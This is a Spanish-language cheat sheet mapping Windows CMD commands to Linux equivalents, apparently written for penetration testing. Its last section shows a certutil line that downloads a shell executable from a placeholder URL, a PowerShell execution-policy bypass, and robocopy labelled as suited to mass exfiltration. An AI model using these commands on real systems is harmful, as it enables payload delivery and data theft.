# Sys
| **Comando CMD** | **Descripción**                      | **Ejemplo**       | **Equivalente Linux** |
| --------------- | ------------------------------------ | ----------------- | --------------------- |
| **`cls`**       | Limpia la pantalla de la consola.    | `cls`             | `clear`               |
| **`help`**      | Muestra ayuda de un comando.         | `help dir`        | `man` / `--help`      |
| **`exit`**      | Cierra la terminal actual.           | `exit`            | `exit` / `logout`     |
| **`echo`**      | Muestra mensajes o variables.        | `echo %USERNAME%` | `echo`                |
| **`set`**       | Muestra o crea variables de entorno. | `set`             | `env` / `export`      |
# Dirs & files
| **Comando CMD**      | **Descripción**                                | **Ejemplo**                       | **Equivalente Linux** |
| -------------------- | ---------------------------------------------- | --------------------------------- | --------------------- |
| **`dir /a`**         | Muestra archivos (incluyendo ocultos).         | `dir /a:h`                        | `ls -la`              |
| **`cd`**             | Cambia de directorio.                          | `cd \Windows`                     | `cd`                  |
| **`type`**           | Muestra el contenido de un archivo.            | `type config.txt`                 | `cat`                 |
| **`copy` / `xcopy`** | Copia archivos o árboles de directorios.       | `xcopy C:\data D:\backup /e`      | `cp` / `cp -r`        |
| **`move`**           | Mueve o renombra archivos.                     | `move old.txt new.txt`            | `mv`                  |
| **`del` / `erase`**  | Elimina uno o más archivos.                    | `del secret.txt`                  | `rm`                  |
| **`md` / `mkdir`**   | Crea un nuevo directorio.                      | `mkdir payloads`                  | `mkdir`               |
| **`rd` / `rmdir`**   | Elimina un directorio.                         | `rd /s /q old_dir`                | `rm -rf`              |
| **`findstr`**        | Busca cadenas de texto (el grep de Windows).   | `type log.txt \| findstr "error"` | `grep`                |
| **`attrib`**         | Cambia atributos (Lectura, Oculto, Sistema).   | `attrib +h file.exe`              | `chmod` / `chattr`    |
| **`tree`**           | Muestra la estructura de carpetas visualmente. | `tree /f`                         | `tree`                |
# Proc
| **Comando CMD**  | **Descripción**                                | **Ejemplo**                               | **Equivalente Linux**   |
| ---------------- | ---------------------------------------------- | ----------------------------------------- | ----------------------- |
| **`tasklist`**   | Lista todos los procesos activos.              | `tasklist /v` (detallado)                 | `ps aux` / `top`        |
| **`taskkill`**   | Mata un proceso por PID o nombre.              | `taskkill /f /im notepad.exe`             | `kill` / `killall`      |
| **`sc`**         | **Gestor de servicios** (crear, iniciar, ver). | `sc query state= all`                     | `systemctl` / `service` |
| **`systeminfo`** | Info detallada (parches, OS, arquitectura).    | `systeminfo`                              | `uname -a` / `lscpu`    |
| **`wmic`**       | Interfaz de gestión (muy potente para enum).   | `wmic process get caption,executablepath` | `ps` / `sysctl`         |
# Net
| **Comando CMD**     | **Descripción**                         | **Ejemplo**             | **Equivalente Linux**   |
| ------------------- | --------------------------------------- | ----------------------- | ----------------------- |
| **`ipconfig /all`** | Configuración completa de red y DNS.    | `ipconfig /all`         | `ip addr` / `ifconfig`  |
| **`netstat -ano`**  | Conexiones activas y puertos (con PID). | `netstat -ano`          | `ss -tulpn` / `netstat` |
| **`ping`**          | Prueba de conectividad básica.          | `ping 10.10.10.1`       | `ping`                  |
| **`tracert`**       | Traza la ruta hasta un host.            | `tracert google.com`    | `traceroute`            |
| **`arp -a`**        | Muestra la tabla de caché ARP.          | `arp -a`                | `arp -n` / `ip neigh`   |
| **`route print`**   | Muestra la tabla de enrutamiento.       | `route print`           | `ip route` / `route`    |
| **`nslookup`**      | Consultas a servidores DNS.             | `nslookup target.local` | `dig` / `host`          |
# Adv
| **Comando CMD**  | **Descripción**                                     | **Ejemplo**                                      | **Equivalente Linux** |
| ---------------- | --------------------------------------------------- | ------------------------------------------------ | --------------------- |
| **`certutil`**   | Herramienta de certificados (usada para descargar). | `certutil -urlcache -f http://url/sh.exe sh.exe` | `wget` / `curl`       |
| **`powershell`** | Invoca el motor de PowerShell.                      | `powershell -ep bypass`                          | `pwsh` / `bash`       |
| **`robocopy`**   | Copia robusta (ideal para exfiltración masiva).     | `robocopy C:\source \\dest\share /mir`           | `rsync`               |
| **`quser`**      | Muestra usuarios logueados en el sistema.           | `quser`                                          | `who` / `w`           |
